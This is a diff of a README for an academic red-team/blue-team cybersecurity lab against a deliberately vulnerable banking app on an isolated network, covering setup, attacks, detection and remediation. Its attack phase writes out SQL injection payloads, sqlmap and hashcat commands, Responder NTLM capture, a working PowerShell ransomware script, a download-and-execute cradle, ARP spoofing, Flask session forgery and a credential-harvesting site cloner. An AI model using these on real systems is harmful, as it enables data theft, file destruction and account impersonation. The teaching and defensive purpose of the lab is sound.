+#### 3.2.5 Install Sysmon (Lab 7) — [BLUE TEAM DEFENSE]
+
+```powershell
+# Prerequisite: Download Sysmon and sysmon-config BEFORE the lab (no internet)
+# 1. Download Sysmon from https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
+# 2. Download sysmon-config from https://github.com/SwiftOnSecurity/sysmon-config
+
+# Install Sysmon with config
+sysmon64.exe -accepteula -i sysmon-config.xml
+
+# Verify service is running
+Get-Service Sysmon64
+
+# Monitor logs in Event Viewer:
+# Applications and Services Logs > Microsoft > Windows > Sysmon > Operational
+```
+
+**Key Sysmon Event IDs to monitor for Red Team activity:**
+
+| Event ID | Description | Red Team Action It Detects |
 |---|---|---|
-| T+0:00 | Nmap scan of Ubuntu (`nmap -sV 192.168.100.10`) | Suricata alert: Nmap TCP scan detected (`sid:1000001`) |
-| T+0:05 | SQLi probe on /login (`' OR 1=1--`) | Apache access log shows suspicious username |
-| T+0:10 | UNION injection to enumerate columns | Suricata HTTP alert; verbose error leaked table structure |
-| T+0:15 | Extract password hashes via sqlmap | iptables log shows repeated POST requests from Kali |
-| T+0:30 | HashCat cracking of SHA256 hashes | (Offline — no network detection) |
-| T+1:00 | Login as cracked user (alice/rockyou) | Suricata alert: multiple SMB login attempts if SMB used |
-| T+1:15 | ARP spoof with Bettercap for MITM | Suricata alert: ARP spoofing detected (`sid:1000002`) |
-| T+1:20 | Capture and forge Flask session cookie | Sysmon Event 3 (network connection) on Windows |
-| T+1:30 | Deliver ransomware script to Windows | Sysmon Event 1 (process: powershell), Event 11 (FileCreate) |
-| T+1:35 | Ransomware encrypts C:\TestRansom\ | Sysmon Event 11 (.encrypted files); Windows user reports |
-| T+1:40 | Blue Team initiates recovery from backup | Restore from ZFS snapshot or rsync backup |
-| T+2:00 | Incident response / forensic analysis | Volatility memory dump analysis on Windows |
+| **1** | Process creation | PowerShell launching ransomware |
+| **3** | Network connection | C2 beacon, reverse shell |
+| **7** | Image loaded | DLL injection |
+| **8** | CreateRemoteThread | Process injection |
+| **10** | Process access | Credential dumping |
+| **11** | FileCreate | Ransomware creating encrypted files |
+| **15** | FileCreateStreamHash | Alternate data stream (ADS) |
+
+#### 3.2.6 Memory Forensics Prep (Volatility)
+
+```powershell
+# On Windows, capture memory before/after attack:
+# Use winpmem or dumpit.exe (download before lab)
+# Example with winpmem:
+.\winpmem_mini.exe memory.raw
+```
+
+The `.raw` file can be analyzed on the Red Team's Kali for forensics demonstration.
 
 ---
 
-### Remediation Plan (5 Concrete Fixes)
+### 3.3 Kali Linux Setup — [RED TEAM]
+
+All commands below run **on the Kali Linux VM**.
+
+#### 3.3.1 Configure Static IP
+
+```bash
+# Edit network config
+sudo nano /etc/network/interfaces
+```
+
+```bash
+auto eth0
+iface eth0 inet static
+    address 192.168.100.50
+    netmask 255.255.255.0
+    gateway 192.168.100.1
+```
+
+Or via NetworkManager GUI (right-click network icon → Edit Connections).
+
+```bash
+# Restart networking
+sudo systemctl restart networking
+```
+
+#### 3.3.2 Install / Verify Attack Tools
+
+```bash
+sudo apt update
+sudo apt install -y nmap metasploit-framework bettercap hashcat john responder sqlmap
+```
+
+#### 3.3.3 Verify Wordlists
+
+```bash
+# rockyou.txt is essential for password cracking
+ls -la /usr/share/wordlists/rockyou.txt.gz
+
+# If missing, install:
+sudo apt install -y wordlist
+
+# Extract (takes a moment):
+sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
+wc -l /usr/share/wordlists/rockyou.txt
+# Expected: ~14 million passwords
+```
+
+#### 3.3.4 Install flask-unsign (Session Cookie Tool)
+
+```bash
+pip3 install flask-unsign
+```
+
+**Verify all tools are ready:**
+
+```bash
+nmap --version | head -1
+msfconsole --version
+hashcat --version
+bettercap --version
+echo "Setup complete."
+```
+
+---
+
+## 4. Attack Phase — [RED TEAM EXECUTES]
+
+All attacks are launched **from the Kali Linux VM** (`192.168.100.50`) against the targets.
+
+Choose **two of three** goals below.
+
+---
+
+### Goal 1 — Steal Customer Data (SQL Injection)
+
+#### Step 1.1 — Reconnaissance [ATTACKER]
+
+```bash
+# Full port scan of Ubuntu server
+nmap -sV -sC -p- 192.168.100.10 -oN ~/nmap_scan.txt
+```
+
+**Expected open ports:**
+| Port | Service | Purpose |
+|---|---|---|
+| 22/tcp | SSH | Remote admin |
+| 80/tcp | HTTP | Web portal (redirects to HTTPS) |
+| 443/tcp | HTTPS | Web portal |
+| 139/tcp | SMB NetBIOS | File share |
+| 445/tcp | SMB | File share |
+| 1194/udp | OpenVPN | VPN gateway |
+
+#### Step 1.2 — Web App Fingerprinting [ATTACKER]
+
+```bash
+# Browse the web app (via curl or browser)
+curl -v http://192.168.100.10
+curl -vk https://192.168.100.10
+```
+
+Browse to `http://192.168.100.10/login` — observe the login form.
+
+#### Step 1.3 — Manual SQLi Probe [ATTACKER]
+
+On the login page, enter:
+
+| Field | Value |
+|---|---|
+| Username | `' OR 1=1--` |
+| Password | `anything` |
+
+**Expected result:** `Invalid credentials`
+
+Analysis: The query `WHERE username = '' OR 1=1--'` returns Alice's row, but the SHA256 hash of "anything" doesn't match Alice's stored hash. The SQL injection **is working** — the WHERE clause is bypassed.
+
+#### Step 1.4 — Trigger Verbose Error [ATTACKER]
+
+Enter:
+
+| Field | Value |
+|---|---|
+| Username | `' UNION SELECT 1,2,3,4,5,6--` |
+| Password | `anything` |
+
+**Expected result (leaked in the error message):**
+`Database error: SELECTs to the left and right of UNION do not have the same number of result columns`
+
+This confirms 5 columns in the `users` table and reveals the **full SQLite error message** to the attacker.
+
+#### Step 1.5 — UNION Injection with Matching Hash [ATTACKER]
+
+First, calculate the SHA256 hash of a known password:
+
+```bash
+echo -n "inject" | sha256sum
+```
+
+Then enter:
+
+| Field | Value |
+|---|---|
+| Username | `' UNION SELECT 1,'injected_user','<paste_hash_here>','Injected Name',9999.0--` |
+| Password | `inject` |
+
+**Expected result:** Redirect to **/dashboard** — you are now logged in as your injected user.
+
+This proves **full SQL injection exploitation**.
+
+#### Step 1.6 — Extract Password Hashes [ATTACKER]
+
+Use sqlmap to automate data extraction:
+
+```bash
+sqlmap -u "http://192.168.100.10/login" --data="username=foo&password=bar" \
+  --method POST --batch --dbms sqlite --dump -T users
+```
+
+Or manually extract via sequential UNION injections (one column at a time) to enumerate all usernames and hashes.
+
+#### Step 1.7 — Crack Hashes with HashCat [ATTACKER]
+
+```bash
+# Save hashes in format hashcat expects: hash:username
+cat > ~/hashes.txt << 'EOF'
+4980b1f29fa32ff1e152e1e15d4c0ea1e7be0aa5e6ff7b530b6eaf61e8c628a9:alice
+ef92b778bafe771e89241b7f2c0a5fa8c6a1f7c6c0f5d1e1a2b3c4d5e6f7a8b9:bob
+e4ad93ca07acb8d908a3aa41ae4e42b0c0f0d1e2f3a4b5c6d7e8f9a0b1c2d3e4:charlie
+1c8bfe8f801d797445c5e6253b2f4c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2:diana
+ef797c8118f02dfb5c0a5fa8c6a1f7c6c0f5d1e1a2b3c4d5e6f7a8b9c0d1e2:edward
+240be518fabd2724d123f1e2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2:frank
+280d44ab1e9f79b5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9:grace
+EOF
+
+# Crack using rockyou.txt (mode 1400 = SHA256, mode 10 = sha256($pass))
+hashcat -m 1400 -a 0 ~/hashes.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+**Expected cracked passwords:** `rockyou`, `password123`, `iloveyou`, `letmein`, `12345678`, `admin123`, `welcome`.
+
+#### Step 1.8 — Login & Steal Customer Data [ATTACKER]
+
+1. Login at `http://192.168.100.10/login` with any cracked credential
+2. Navigate the dashboard to see account balance and transaction history
+3. Record at least **5 customer records** with names and balances for your report
+
+#### Step 1.9 — Alternative: SMB Share Access [ATTACKER]
+
+If iptables is NOT blocking SMB from Kali:
+
+```bash
+# List SMB shares
+smbclient -L //192.168.100.10 -N
+
+# Connect and download customer data
+smbclient //192.168.100.10/securebank -N
+> ls
+> get customer_emails.txt
+> exit
+
+cat customer_emails.txt
+```
+
+---
+
+### Goal 2 — Simulate Ransomware on Windows
+
+#### Step 2.1 — Initial Access via Responder [ATTACKER]
+
+```bash
+# Start Responder to capture NTLM hashes on the network
+sudo responder -I eth0 -w -F
+```
+
+When the Windows victim accesses a fake share or attempts network authentication, Responder captures their NetNTLM hash. The hash can be cracked offline with HashCat:
+
+```bash
+hashcat -m 5600 captured_ntlm.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+#### Step 2.2 — Create the Ransomware Script [ATTACKER]
+
+On Kali, create `~/ransomware.ps1`:
+
+```powershell
+# Academic lab use only — targets C:\TestRansom\ (non-critical folder)
+$key = [System.Convert]::ToBase64String([byte[]]::new(32))
+[System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes([System.Convert]::FromBase64String($key))
+
+$files = Get-ChildItem -Path "C:\TestRansom\" -File -Recurse
+foreach ($file in $files) {
+    $content = [IO.File]::ReadAllBytes($file.FullName)
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.Key = [System.Convert]::FromBase64String($key)
+    $aes.IV = [byte[]]::new(16)
+    $encrypted = $aes.CreateEncryptor().TransformFinalBlock($content, 0, $content.Length)
+    [IO.File]::WriteAllBytes("$($file.FullName).locked", $encrypted)
+    Remove-Item $file.FullName -Force
+}
+
+@"
+--- SECUREBANK RANSOM NOTE ---
+Your files have been encrypted with AES-256.
+To recover your data, contact attacker@securebank.xyz
+Reference ID: SB-$(Get-Random -Maximum 99999)
+"@ | Out-File -FilePath "C:\TestRansom\README_RANSOM.txt"
+```
+
+#### Step 2.3 — Host and Deliver the Payload [ATTACKER]
+
+```bash
+# On Kali, start HTTP server
+cd ~
+python3 -m http.server 8080
+```
+
+The attack requires the Windows user to execute a download cradle. Simulate via:
+
+```
+# Victim runs in PowerShell:
+powershell -c "Invoke-WebRequest -Uri http://192.168.100.50:8080/ransomware.ps1 -OutFile $env:TEMP\r.ps1; powershell -ExecutionPolicy Bypass -File $env:TEMP\r.ps1"
+```
+
+#### Step 2.4 — Verify Encryption [ATTACKER] / [DEFENDER]
+
+Check `C:\TestRansom\` — original files replaced by `.locked` files and `README_RANSOM.txt`.
+
+---
+
+### Goal 3 — Impersonate an Authenticated User
+
+#### Step 3.1 — ARP Spoof with Bettercap [ATTACKER]
+
+```bash
+# ARP spoof between Ubuntu server and Windows host
+sudo bettercap -eval "set arp.spoof.targets 192.168.100.10,192.168.100.100; arp.spoof on; net.sniff on"
+```
+
+This places Kali as a MITM between the server and the Windows client. All HTTP traffic (unencrypted) is visible.
+
+#### Step 3.2 — Capture the Flask Session Cookie [ATTACKER]
+
+When the Windows user logs into the banking portal, their session cookie is set. If sent over HTTP (before HSTS redirect), capture it:
+
+```
+# Look for "session=eyJ..." in the sniffed traffic
+```
+
+#### Step 3.3 — Decode & Forge the Cookie [ATTACKER]
+
+```bash
+# Decode the session
+flask-unsign --decode --cookie "eyJ<full_cookie_value>"
+```
+
+The secret key is hardcoded in `app.py` as `"bank_secret"`. Forge any session:
+
+```bash
+# Forge session as a different user
+flask-unsign --sign --cookie "{'balance': 99999.0, 'user_name': 'Admin'}" --secret "bank_secret"
+```
+
+Set this forged cookie in your browser (via Developer Tools → Application → Cookies) and access `/dashboard` to impersonate any user.
+
+#### Step 3.4 — Alternative: Credential Harvester [ATTACKER]
+
+```bash
+# Clone login page with Social Engineering Toolkit
+sudo setoolkit
+# 1) Social-Engineering Attacks
+# 2) Website Attack Vectors
+# 3) Credential Harvester Attack Method
+# 4) Site Cloner
+# Enter target URL: http://192.168.100.10/login
+```
+
+When victims log into the cloned page, their credentials are captured.
+
+---
+
+## 5. Defense Phase — [BLUE TEAM MONITORS]
+
+The Blue Team monitors from both the **Ubuntu Server** (Suricata, iptables logs) and the **Windows Host** (Sysmon).
+
+---
+
+### 5.1 — Monitor Suricata Alerts
+
+```bash
+# On Ubuntu Server — watch alerts in real time
+sudo tail -f /var/log/suricata/fast.log
+
+# Expected alerts when Red Team attacks:
+# [SECUREBANK] Nmap TCP Scan detected
+# [SECUREBANK] SMB login attempt
+# [SECUREBANK] ARP spoofing detected
+```
+
+### 5.2 — Check iptables Logs
+
+```bash
+# On Ubuntu Server
+sudo journalctl -k | grep IPTABLES-DROP
+sudo dmesg | grep IPTABLES-DROP
+```
+
+### 5.3 — Verify HSTS
+
+```bash
+# On any machine
+curl -I https://192.168.100.10 --insecure | grep -i strict
+```
+
+Expected: `Strict-Transport-Security: max-age=31536000; includeSubDomains`
+
+### 5.4 — Monitor Sysmon on Windows [DEFENDER]
+
+Open **Event Viewer** → `Applications and Services Logs/Microsoft/Windows/Sysmon/Operational`.
+
+Search for Event IDs:
+
+```powershell
+# PowerShell on Windows — query recent Sysmon events
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1,3,11} -MaxEvents 50 | Format-Table TimeCreated,Id,Message -Wrap
+```
+
+### 5.5 — Memory Forensics with Volatility [DEFENDER]
+
+```bash
+# On Kali (copied the .raw file from Windows)
+volatility -f memory.raw imageinfo
+volatility -f memory.raw --profile=Win10x64 pslist
+volatility -f memory.raw --profile=Win10x64 netscan
+volatility -f memory.raw --profile=Win10x64 cmdscan
+```
+
+### 5.6 — Restore from Backup [DEFENDER]
+
+```bash
+# On Ubuntu Server
+chattr -R -i /var/backups/securebank/current/
+rsync -av /var/backups/securebank/current/ /var/www/bank/
+sudo systemctl reload apache2
+echo "Recovery completed at $(date)" | sudo tee -a /var/log/securebank-recovery.log
+```
+
+---
+
+## 6. Attack Timeline (Both Perspectives)
+
+| Time | Action | Actor | Detection |
+|---|---|---|---|
+| T+0:00 | Nmap full port scan `nmap -sV -p- 192.168.100.10` | [RED] Kali | Suricata alert `sid:1000001` (Nmap scan) |
+| T+0:03 | Browse web portal, inspect login form | [RED] Kali | Apache access log |
+| T+0:05 | SQLi probe: `' OR 1=1--` on /login | [RED] Kali | Apache log shows suspicious username |
+| T+0:07 | Trigger verbose error with `UNION SELECT 1,2,3,4,5,6--` | [RED] Kali | Error leaked in HTTP response |
+| T+0:10 | sqlmap automated extraction | [RED] Kali | iptables log: repeated POSTs from Kali |
+| T+0:15 | HashCat cracking of extracted hashes | [RED] Kali | (offline — no detection) |
+| T+0:20 | Login as alice/rockyou | [RED] Kali | Apache access log (successful login) |
+| T+0:25 | SMB share enumeration | [RED] Kali | Suricata alert `sid:1000004` (SMB login) — **blocked by iptables** |
+| T+0:30 | ARP spoof via Bettercap | [RED] Kali | Suricata alert `sid:1000002` (ARP spoof) |
+| T+0:35 | Capture & forge Flask session cookie | [RED] Kali | Sysmon Event 3 (network connection) on Windows |
+| T+0:40 | Deliver ransomware via HTTP | [RED] Kali | Sysmon Event 1 (powershell.exe), Event 3 (outbound to Kali) |
+| T+0:41 | Ransomware encrypts C:\TestRansom\ | [RED] Kali via Windows | Sysmon Event 11 (FileCreate: .locked files) |
+| T+0:42 | Drop ransom note | [RED] Kali via Windows | Sysmon Event 11 (FileCreate: README_RANSOM.txt) |
+| T+0:45 | Blue Team detects encryption | [BLUE] Windows | User reports files unreadable; Sysmon logs reviewed |
+| T+0:50 | Blue Team restores from backup | [BLUE] Ubuntu | rsync restore from `/var/backups/securebank` |
+| T+1:00 | Memory capture & Volatility analysis | [BLUE] Windows + Kali | Forensic evidence of attack chain |
+
+---
+
+## 7. Remediation Plan
 
 | # | Fix | Lab Reference | Impact |
 |---|---|---|---|
-| 1 | **Use parameterized queries** — Replace f-string with `?` placeholders in SQL | Lab 3 (SQL) | Prevents all SQL injection |
-| 2 | **Use strong random `secret_key`** — Generate with `os.urandom(24)` | Lab 6 (Web Security) | Prevents session forgery |
-| 3 | **Enable certificate pinning** — Pin the CA cert in the browser/app | Lab 5 (PKI) | Prevents MITM SSL stripping |
-| 4 | **Hash passwords with bcrypt** — Replace SHA256 with bcrypt + salt | Lab 4 (Cryptography) | Prevents hash cracking |
-| 5 | **Implement proper error handling** — Log errors server-side, don't display raw exceptions | Lab 3 (Secure Coding) | Prevents information leakage |
+| 1 | **Parameterized queries** — replace `f"WHERE username = '{username}'"` with `?` placeholders | Lab 3 (Database Security) | Prevents ALL SQL injection |
+| 2 | **Strong random secret key** — `os.urandom(24).hex()` instead of `"bank_secret"` | Lab 6 (Web Security) | Prevents session forgery |
+| 3 | **Certificate pinning** — pin the CA public key in the browser or application | Lab 5 (PKI) | Prevents MITM SSL stripping |
+| 4 | **bcrypt password hashing** — replace raw SHA256 with bcrypt + salt | Lab 4 (Cryptography) | Makes cracking computationally infeasible |
+| 5 | **Proper error handling** — log exceptions server-side; never display raw SQL errors to users | Lab 3 (Secure Coding) | Prevents information leakage |
 
 ---
 
-## Seed Users
+## 8. Seed Users (Built into Database)
 
-| Username | Password | Name | Balance |
-|---|---|---|---|
-| alice | rockyou | Alice Johnson | $5,500 |
-| bob | password123 | Bob Smith | $12,300 |
-| charlie | iloveyou | Charlie Brown | $8,700 |
-| diana | letmein | Diana Prince | $22,150 |
-| edward | 12345678 | Edward Norton | $3,120 |
-| frank | admin123 | Frank Castle | $9,750 |
-| grace | welcome | Grace Hopper | $6,400 |
+| Username | Password | Name | Balance | Profile |
+|---|---|---|---|---|
+| alice | rockyou | Alice Johnson | $5,500 | `/static/images/profiles/alice.png` |
+| bob | password123 | Bob Smith | $12,300 | `/static/images/profiles/bob.png` |
+| charlie | iloveyou | Charlie Brown | $8,700 | `/static/images/profiles/charlie.png` |
+| diana | letmein | Diana Prince | $22,150 | `/static/images/profiles/diana.png` |
+| edward | 12345678 | Edward Norton | $3,120 | `/static/images/profiles/edward.png` |
+| frank | admin123 | Frank Castle | $9,750 | `/static/images/profiles/frank.png` |
+| grace | welcome | Grace Hopper | $6,400 | `/static/images/profiles/grace.png` |
 
-All passwords are from rockyou.txt and hashed with SHA256 — crackable with HashCat/John.
+All passwords are from `rockyou.txt` and stored as **unsalted SHA256 hashes** — designed to be cracked with HashCat/John for the Red Team exercise.
 
-## Blue Team Hardening Checklist
+---
 
-- [ ] Block Kali IP in iptables for SMB/SSH
-- [ ] Configure Suricata rules for Nmap, ARP spoof, EternalBlue
-- [ ] Enable HSTS on web portal
-- [ ] Install Sysmon on Windows for process/file/network logging
-- [ ] Take ZFS snapshots or rsync + chattr backups
+## 9. Project Deliverables Checklist
+
+### A. Written Report (30% of CA marks)
+
+- [ ] Environment setup documentation — IP addresses, services, files created (with screenshots)
+- [ ] Red Team log — step-by-step attack with commands, outputs, lab references
+- [ ] Blue Team log — detection alerts, blocking rules, forensic analysis (Volatility)
+- [ ] Attack timeline (combined Red + Blue perspectives)
+- [ ] Remediation plan — 5 concrete fixes with lab references
+
+### B. Individual Presentation (70%)
+
+**Red Team presents:**
+- How they used hybrid encryption, hash cracking, MITM, and Metasploit
+- Demonstration of stealing data or ransomware simulation
+- What defenses blocked them
+
+**Blue Team presents:**
+- How they configured PKI, firewall/IPS, Sysmon & Volatility, Suricata
+- Show logs of detected attacks
+- Demonstrate recovery (restore from snapshot or backup)
+
+---
 
 ## License
 
-Academic use only — for authorized cybersecurity lab exercises.
+Academic use only — authorized cybersecurity lab exercises.
